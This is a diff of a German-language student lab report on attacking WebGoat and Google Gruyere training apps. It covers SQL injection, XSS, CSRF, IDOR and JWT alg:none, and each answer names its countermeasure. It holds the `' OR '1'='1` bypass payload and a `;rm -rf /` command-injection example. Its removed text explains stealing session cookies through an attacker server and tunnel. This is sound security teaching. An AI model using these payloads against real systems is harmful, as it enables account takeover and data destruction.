+**Screenshot – Vollständiger manipulierter Token:**
+
+![Manipulierter JWT Token](VollständigermanipulierterToken(TextoderScreenshot).png)
+
+Der Token wurde in WebGoat eingereicht (via DevTools Application → Cookies: `access_token`).
+
+---
+
+### Schritt 3 – Grüne Bestätigung in WebGoat
+
+**Screenshot – Erfolgreicher JWT-Angriff:**
+
+![JWT Bestätigung WebGoat](ScreenshotgrüneWebGoat-Bestätigung.png)
+
+WebGoat zeigt: **«Herzlichen Glu00FCckwunsch! Sie haben diesen Auftrag erfolgreich abgeschlossen.»**  
+Im Bereich «Vote for your favorite» ist zu sehen: **«Welcome back, Tom»** – der Benutzer Tom wurde erfolgreich als Admin authentifiziert und konnte die Votes zurücksetzen.
 
 ---
 
 ## Schriftliche Antworten
 
-### B1 – Stored XSS / DOM-Manipulation
+### B – SQL Injection
 
-**1. Warum konnte `<img onerror>` die Sicherheitsprüfung umgehen?**
+**1. SQL-Statement vor und nach dem Einschleusen:**
 
-Browser blockieren `<script>`-Tags in Formularfeldern häufig, weil dies ein bekannter Angriffspunkt ist und manche CSP-Implementierungen `<script>` explizit verbieten. Das `<img>`-Tag hingegen ist ein vollkommen legitimes HTML-Element – Browser müssen es rendern. Der `onerror`-Event-Handler ist ein Standard-HTML-Attribut und wird nicht pauschal blockiert. Da `src="x"` keine gültige Bild-URL ist, schlägt das Laden fehl und `onerror` wird automatisch ausgeführt – ganz ohne dass je ein `<script>`-Tag beteiligt war.
+Vor dem Payload:
+```sql
+SELECT * FROM users WHERE name = 'Smith' AND password = 'eingabe'
+```
 
-**2. Was bedeutet es, dass der Payload auch im Browser des Verteidigers ausgeführt wird?**
+Nach dem Payload `' OR '1'='1`:
+```sql
+SELECT * FROM users WHERE name = 'Smith' AND password = '' OR '1'='1'
+```
 
-Das ist der entscheidende Unterschied zwischen Stored XSS und harmlosen Darstellungsfehlern: Der Code läuft **im Sicherheitskontext des Opfers** – mit dessen Session, dessen Cookies und dessen Rechten. Ein Angreifer kann damit den Cookie stehlen, Aktionen im Namen des Opfers ausführen oder weitere Payloads nachladen. Das Opfer merkt in der Regel nichts davon.
+Die Authentifizierung wird umgangen, weil `OR '1'='1'` immer `TRUE` ergibt. Die Datenbank gibt alle Zeilen zurück, und die Applikation interpretiert das als erfolgreichen Login.
+
+**2. Prepared Statements:**
+
+Prepared Statements (parametrisierte Abfragen) trennen SQL-Code von Benutzerdaten auf Datenbankebene. Der Platzhalter `?` wird vom Datenbankserver vorcompiliert; die Benutzereingabe wird danach nur als Datenwert eingesetzt – nie als SQL-Code interpretiert:
+
+```java
+PreparedStatement stmt = conn.prepareStatement(
+    "SELECT * FROM users WHERE name = ? AND password = ?"
+);
+stmt.setString(1, userName);
+stmt.setString(2, password);
+```
+
+Selbst wenn ein Benutzer `' OR '1'='1` eingibt, behandelt der Datenbankserver das als reinen String-Wert, nicht als SQL-Syntax.
 
 **3. OWASP Top 10 Kategorie:**
 
-**A03:2021 – Injection** (XSS ist Teil dieser Kategorie). In der OWASP Top 10 2025 wird XSS voraussichtlich unter **A03 – Injection** verbleiben.
+**A03:2021 – Injection** (umfasst SQL Injection, OS Command Injection, LDAP Injection u.a.)
 
-**4. Gegenmassnahme – Output Encoding:**
+**4. Zwei weitere Injection-Varianten:**
 
-Die Applikation hätte den Snippet-Inhalt vor der Ausgabe im HTML **escapen** müssen. Dabei werden Sonderzeichen in HTML-Entitäten umgewandelt:
+- **OS Command Injection:** Benutzereingaben werden in Betriebssystembefehlen ausgeführt (z.B. `ping <input>`). Ein Angreifer kann mit `;rm -rf /` weitere Befehle anhängen und das System kompromittieren.
+- **LDAP Injection:** In Verzeichnisdiensten (Active Directory) können Sonderzeichen wie `*` oder `)` in LDAP-Filtern eigeschleust werden, um Zugriffskontrollen zu umgehen oder alle Benutzer aufzulisten.
+
+---
+
+### C – Cross-Site Scripting (XSS)
+
+**1. Reflected vs. Stored XSS:**
+
+| Merkmal | Reflected XSS | Stored XSS |
+|---------|---------------|------------|
+| Persistenz | Kein (nur in URL/Anfrage) | Ja (in Datenbank gespeichert) |
+| Reichweite | Nur wer den manipulierten Link öffnet | Alle Benutzer, die die Seite aufrufen |
+| Beispiel | Phishing-Link mit Payload in URL | Kommentarfeld mit gespeichertem Script |
+
+**2. DOM-based XSS vs. Reflected XSS:**
+
+Bei DOM-based XSS verarbeitet JavaScript im Browser die Eingabe direkt (z.B. `location.hash`, `document.write()`), ohne dass der Payload den Server je erreicht. Serverseitige Filter sehen den Payload gar nicht und können ihn deshalb nicht blockieren. Bei Reflected XSS wird der Payload vom Server in der HTTP-Antwort zurückgespiegelt – dort kann ein serverseitiger Filter eingreifen.
+
+**3. Output Encoding:**
+
+Output Encoding wandelt Sonderzeichen in HTML-Entitäten um, sodass der Browser sie nicht als Code interpretiert. Beispiel:
 
 ```
-Eingabe:  <img src="x" onerror="...">
-Ausgabe:  &lt;img src=&quot;x&quot; onerror=&quot;...&quot;&gt;
+Eingabe:    <script>alert('XSS')</script>
+Nach Encoding: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
 ```
 
-Der Browser zeigt dann den Text an, interpretiert ihn aber nicht als HTML-Code. Bibliotheken wie OWASP Java Encoder oder die Templating-Engine des Frameworks übernehmen das automatisch.
+Der Browser zeigt den Text an, führt ihn aber nicht als Code aus.
+
+**4. Content-Security-Policy (CSP):**
+
+CSP ist ein HTTP-Antwortheader, der festlegt, von welchen Quellen Skripte geladen werden dürfen:
+
+```
+Content-Security-Policy: script-src 'self' https://trusted.cdn.com
+```
+
+Inline-Skripte (`<script>alert()</script>`) und fremde Quellen werden blockiert, was XSS erheblich erschwert, auch wenn ein Payload eingefügt wurde.
+
+**5. OWASP Top 10 Kategorie:**
+
+**A03:2021 – Injection** (XSS ist Teil dieser Kategorie seit 2021, zuvor A07:2017)
 
 ---
 
-### B2 – Cookies
+### D – CSRF
 
-**1. Was kann ein Angreifer mit dem Session-Cookie tun?**
+**1. Warum schickt der Browser den Session-Cookie mit?**
 
-Ein Session-Cookie ist der einzige Beweis, den der Server braucht, um einen Benutzer zu identifizieren. Wer den Cookie kennt, kann ihn in seinen eigenen Browser eintragen (DevTools → Application → Cookies → Wert ersetzen) und ist danach für den Server identisch mit dem Opfer – ohne je dessen Passwort zu kennen. Der Angreifer kann alle Aktionen im Namen des Opfers ausführen: Daten lesen, ändern, löschen, Nachrichten senden usw.
+Browser senden Cookies automatisch zu ihrer Domain, unabhängig davon, von welcher Seite die Anfrage ausgelöst wird. Das ist das Grundprinzip von HTTP-Cookies. Wenn `csrf-attack.html` (lokal geöffnet) ein Formular an `54.81.121.45:8080` sendet, schickt der Browser alle für diese Domain gespeicherten Cookies (inkl. `JSESSIONID`) automatisch mit – das Opfer muss die Angreifer-Seite nicht «bewusst» besucht haben.
 
-**2. Was bewirkt das `HttpOnly`-Flag?**
+**2. CSRF-Token:**
 
-Das `HttpOnly`-Flag verhindert, dass JavaScript überhaupt auf den Cookie zugreifen kann. `document.cookie` gibt einen mit `HttpOnly` gesetzten Cookie nicht zurück – er ist für JavaScript schlicht unsichtbar. Der in B2 verwendete Payload `document.cookie` hätte damit einen leeren String geliefert und der Angriff wäre gescheitert. Der Cookie wird trotzdem bei HTTP-Anfragen automatisch mitgeschickt – der Browser handhabt das transparent, aber JavaScript hat keinen Zugriff.
+Ein CSRF-Token ist ein zufälliger, geheimer Wert, der serverseitig generiert und im HTML-Formular eingebettet wird. Bei jeder sensitiven Anfrage muss er mitgeschickt und serverseitig validiert werden. Eine Angreifer-Seite kann ihn wegen der **Same-Origin-Policy** nicht aus dem HTML der legitimen Seite auslesen – sie kann also keinen gültigen Token kennen.
 
-**3. Warum ist `localStorage` gefährlicher als `HttpOnly`-Cookies?**
+**3. SameSite=Strict:**
 
-`localStorage` ist für jedes JavaScript auf der gleichen Domain vollständig lesbar – ohne Einschränkung. Es gibt kein `HttpOnly`-Äquivalent. Ein einziger XSS-Payload genügt, um den gesamten `localStorage` auszulesen und an einen Angreifer-Server zu schicken. Mit einem `HttpOnly`-Cookie ist dasselbe nicht möglich, da JavaScript gar keinen Zugriff hat. Tokens oder sensible Daten im `localStorage` zu speichern ist daher grundsätzlich unsicherer.
+Das `SameSite=Strict`-Flag verhindert, dass der Browser den Cookie bei Cross-Site-Anfragen (also von einer anderen Origin aus) mitschickt. Wenn `csrf-attack.html` ein Formular an WebGoat sendet, würde der JSESSIONID-Cookie mit `SameSite=Strict` nicht mitgeschickt – die Anfrage landet unauthentifiziert und schlägt fehl.
 
----
+**4. OWASP Top 10 Kategorie:**
 
-### B3 – Session-Hijacking
-
-**1. Warum konnte der Angreifer den Cookie ohne Passwort erhalten?**
-
-Der Payload wurde in der Gruyere-Datenbank gespeichert. Beim nächsten Seitenaufruf des Verteidigers führte dessen Browser den JavaScript-Code aus – vollständig im Kontext des Verteidigers, mit dessen Cookies. Der `new Image().src=...`-Trick sendete den Cookie im Hintergrund an den Angreifer-Server. Der Angreifer brauchte keinen direkten Zugriff auf den Browser oder das Gerät des Opfers.
-
-**2. Warum funktioniert `new Image().src` trotz Same-Origin-Policy?**
-
-Die Same-Origin-Policy (SOP) verhindert, dass JavaScript die **Antwort** einer Cross-Origin-Anfrage lesen kann. Das **Senden** einer Anfrage (GET) ist jedoch erlaubt – der Browser schickt die Anfrage ab, darf aber die Antwort nicht auswerten. `new Image().src=...` sendet nur eine GET-Anfrage und erwartet keine lesbare Antwort. Der Angreifer-Server empfängt die Anfrage mit dem Cookie im URL-Parameter – das reicht für den Diebstahl. Die SOP schützt also nicht gegen das Senden von Daten, sondern nur gegen das Lesen von Antworten anderer Origins.
-
-**3. Warum war der Serveo-Tunnel notwendig?**
-
-Gruyere läuft unter HTTPS (`https://google-gruyere.appspot.com`). Browser blockieren **Mixed Content**: Eine HTTPS-Seite darf keine HTTP-Anfragen ins Internet schicken. Die EC2-Instanz wäre nur per HTTP erreichbar (`http://<EC2-IP>:9000`). Der Browser hätte die Anfrage blockiert und der Cookie wäre nie angekommen. Der Serveo-Tunnel gibt dem Python-Server eine öffentliche HTTPS-URL – damit ist die Anfrage HTTPS→HTTPS und wird nicht blockiert.
-
-**4. Technische Massnahmen zur Verhinderung:**
-
-- **HttpOnly-Flag:** JavaScript kann `document.cookie` nicht lesen → Payload schlägt fehl.
-- **Content-Security-Policy (CSP):** `script-src 'self'` verhindert, dass Inline-JavaScript und externe Ressourcen geladen werden – `<img onerror>` würde blockiert.
-- **Output Encoding:** Der Snippet-Inhalt wird escaped, bevor er ins HTML eingefügt wird → Payload wird als Text angezeigt, nicht ausgeführt.
-- **Input Validation:** Snippets werden auf erlaubte Zeichen/Tags geprüft; HTML-Tags werden abgelehnt oder entfernt.
-
-**5. Was bewirkt das `Secure`-Flag?**
-
-Das `Secure`-Flag stellt sicher, dass der Cookie **nur über HTTPS** gesendet wird. Bei unverschlüsselten HTTP-Verbindungen sendet der Browser den Cookie gar nicht mit. Das schützt gegen Man-in-the-Middle-Angriffe, bei denen ein Angreifer den Netzwerkverkehr abfängt (z.B. in einem ungesicherten WLAN). Im Kontext dieses Angriffs hätte `Secure` allerdings nicht geholfen, da der Payload bereits im HTTPS-Kontext ausgeführt wurde.
+**A01:2021 – Broken Access Control** (CSRF wurde 2021 aus der separaten Kategorie A8:2017 hierunter eingeordnet)
 
 ---
 
-### C – Reflected XSS
+### E – IDOR (Broken Access Control)
 
-**1. Hauptunterschied Stored XSS vs. Reflected XSS:**
+**1. «Security through Obscurity» reicht nicht:**
 
-| Merkmal | Stored XSS | Reflected XSS |
-|---------|-----------|---------------|
-| Persistenz | Ja – Payload in DB gespeichert | Nein – nur in URL/Parameter |
-| Reichweite | Alle Benutzer, die die Seite aufrufen | Nur wer den manipulierten Link öffnet |
-| Verbreitung | Automatisch, kein Link nötig | Angreifer muss Link zum Opfer schicken |
-| Erkennbarkeit | Schwerer – kein verdächtiger Link | Einfacher – manipulierte URL sichtbar |
+Das Weglassen eines Links schützt eine Ressource nicht. Angreifer können IDs systematisch durchprobieren (Enumeration), Netzwerkverkehr analysieren oder Fehlermeldungen auswerten, um Ressourcen zu finden. Sicherheit muss durch **serverseitige Autorisierungsprüfung** gewährleistet werden, nicht durch Verstecken.
 
-**2. Social Engineering – wie bringt man das Opfer zum Klick?**
+**2. Verhinderung von IDOR:**
 
-Ein Angreifer würde den manipulierten Link tarnen:
-- **Phishing-E-Mail** mit einem «legitim» aussehenden Link (z.B. «Ihre Gruyere-Sitzung ist abgelaufen, bitte hier klicken»)
-- **URL-Shortener** (bit.ly, tinyurl.com) verstecken die eigentliche URL
-- **Typosquatting** – ähnliche Domain wie die echte Seite
-- In sozialen Medien oder Foren gepostete Links mit verlockenden Beschreibungen
+Die Applikation muss bei jeder Anfrage prüfen: «Gehört diese Ressource (ID: 2342388) dem aktuell eingeloggten Benutzer?» Beispiel-Pseudocode:
 
-**3. OWASP Proactive Control gegen XSS:**
+```python
+if request.user.id != profile.user_id:
+    return 403 Forbidden
+```
 
-**C4 – Encode and Escape Data** (OWASP Top 10 Proactive Controls)  
-Referenz: `owasp.org/www-project-proactive-controls`
+Nur wenn der eingeloggte Benutzer Eigentümer der Ressource ist (oder explizit berechtigt), darf der Zugriff erfolgen.
 
-Dieser Control fordert, alle Ausgaben kontextabhängig zu enkodieren: HTML-Encoding für HTML-Kontext, JavaScript-Encoding für JS-Kontext, URL-Encoding für URL-Parameter. Damit wird verhindert, dass eingeschleuste Daten als Code interpretiert werden.
+**3. Horizontale vs. vertikale Privilegienerweiterung:**
+
+- **Horizontal:** Zugriff auf Ressourcen anderer Benutzer mit derselben Berechtigungsstufe (z.B. Profil eines anderen normalen Users lesen). ← **Dieses IDOR-Beispiel**
+- **Vertikal:** Zugriff auf Ressourcen oder Funktionen einer höheren Berechtigungsstufe (z.B. normaler User greift auf Admin-Funktionen zu).
+
+**4. OWASP Top 10 Kategorie:**
+
+**A01:2021 – Broken Access Control** – Platz 1, da 94% aller geprüften Applikationen mindestens eine Form von Broken Access Control aufweisen. Fehlende oder fehlerhafte Zugriffskontrolle ist die häufigste und kritischste Schwachstellenkategorie.
 
 ---
 
-### D – Client-State Manipulation
+### F – JWT Tokens
 
-**1. Warum ist es gefährlich, Rollen im Client zu speichern?**
+**1. Sicherheitsproblem alg:none:**
 
-Der Client (Browser) liegt vollständig unter der Kontrolle des Benutzers. Alles, was im Cookie oder `localStorage` gespeichert ist, kann der Benutzer direkt lesen und verändern – mit DevTools in Sekunden. Sicherheitsrelevante Daten wie Rollen, Berechtigungen oder Admin-Flags im Client zu speichern bedeutet, dem Benutzer zu vertrauen, dass er diese Werte nicht manipuliert. Das ist grundsätzlich falsch: Sicherheitsentscheidungen dürfen niemals auf dem Client basieren.
+Wenn ein Server `"alg":"none"` akzeptiert, deaktiviert er die Signaturprüfung. Jeder Angreifer kann den Payload beliebig verändern (z.B. `"admin":"true"`) und einen Token ohne Signatur einreichen. Der Server akzeptiert ihn, weil er glaubt, keine Signaturprüfung sei konfiguriert – die Integrität des Tokens ist vollständig kompromittiert.
 
-**2. Berechtigungsprüfungen: Client oder Server?**
+**2. Base64url-Kodierung ist keine Verschlüsselung:**
 
-**Immer auf dem Server.** Der Server ist die einzige vertrauenswürdige Komponente im System – er liegt unter der Kontrolle des Betreibers, nicht des Benutzers. Clientseitige Checks (z.B. in JavaScript) sind nützlich für die Benutzererfahrung (schnelle Rückmeldung), aber nie für die Sicherheit. Jede Serveranfrage muss serverseitig prüfen: «Hat dieser authentifizierte Benutzer die Berechtigung, diese Aktion auszuführen?» – unabhängig davon, was der Client behauptet.
+JWT-Payloads sind nur Base64url-kodiert – jeder kann sie trivial dekodieren. Sensible Daten (Passwörter, persönliche Informationen, interne IDs) dürfen niemals im JWT-Payload transportiert werden, da sie für jeden lesbar sind, der den Token abfängt. Für Vertraulichkeit müsste JWE (JSON Web Encryption) verwendet werden.
 
-**3. OWASP Top 10 Kategorie:**
+**3. Gegenmassnahmen gegen JWT-Angriffe:**
 
-**A01:2021 – Broken Access Control** (betrifft Zugriffskontrolle und Berechtigungen)  
-In der OWASP Top 10 2025 voraussichtlich weiterhin **A01 – Broken Access Control**.
+- **Algorithmus-Whitelist:** Server akzeptiert nur bestimmte Algorithmen (z.B. nur `HS256` oder `RS256`), niemals `none`.
+- **Kurze Ablaufzeiten (exp):** Tokens sollten nach kurzer Zeit (z.B. 15 Minuten) ablaufen, um den Schaden bei Token-Diebstahl zu begrenzen.
+- **Serverseitige Signaturprüfung:** Die Signatur muss immer mit dem geheimen Schlüssel verifiziert werden, bevor der Payload vertraut wird.
+- **Bibliotheken verwenden:** Keine eigene JWT-Implementierung schreiben – bewährte Libraries (z.B. `java-jwt`, `PyJWT`) sind robuster gegen bekannte Angriffe.
+
+**4. OWASP Top 10 Kategorie:**
+
+**A07:2021 – Identification and Authentication Failures** (früher «Broken Authentication»). Diese Kategorie umfasst fehlerhafte Implementierungen von Authentifizierungs- und Session-Management-Mechanismen.
 
 ---
 
@@ -388,24 +637,11 @@ In der OWASP Top 10 2025 voraussichtlich weiterhin **A01 – Broken Access Contr
 
 | Aufgabe | Schwachstelle | OWASP Top 10 (2021) |
 |---------|--------------|---------------------|
-| B1, B2, B3 | Stored XSS | A03 – Injection |
-| C | Reflected XSS | A03 – Injection |
-| D | Client-State Manipulation | A01 – Broken Access Control |
+| B | SQL Injection | A03 – Injection |
+| C | Cross-Site Scripting | A03 – Injection |
+| D | CSRF | A01 – Broken Access Control |
+| E | IDOR | A01 – Broken Access Control |
+| F | JWT alg:none | A07 – Identification and Authentication Failures |
 
 ---
 
-## Screenshot-Übersicht
-
-| Dateiname | Inhalt |
-|-----------|--------|
-| `gruyere_1.png` | Beide Accounts erstellt (verteidiger-yann links, angreifer-yanni rechts mit «Account created.») |
-| `gruyere_2.png` | Stored XSS B1 – roter Menühintergrund bei Angreifer (oben) und Verteidiger (unten) |
-| `gruyere_3.png` | B2 – Cookie-Anzeige im roten Kasten, beide Fenster + DevTools mit Cookie-Werten |
-| `gruyere_als_verteidiger.png` | DevTools Application → Cookies des Verteidigers (GRUYERE=115461269\|verteidiger-yann\|\|author) |
-| `onerror.png` | B1 – Verteidiger-Fenster mit rotem Menü + DevTools Cookies (Beweis für cross-user Ausführung) |
-| `alert.png` | C – Reflected XSS Alert-Dialog, Payload in URL-Leiste sichtbar |
-| `admin.png` | C – DevTools Network Response mit Payload im HTML-Quelltext (Zeilen 154, 166) |
-| `terminal1.png` | B3 – Python HTTP-Server mit eingehenden Cookie-Anfragen (gestohlene Cookies sichtbar) |
-| `terminal2.png` | B3 – Serveo SSH-Tunnel mit zugewiesener HTTPS-URL (`https://e581525f...serveousercontent.com`) |
-
----
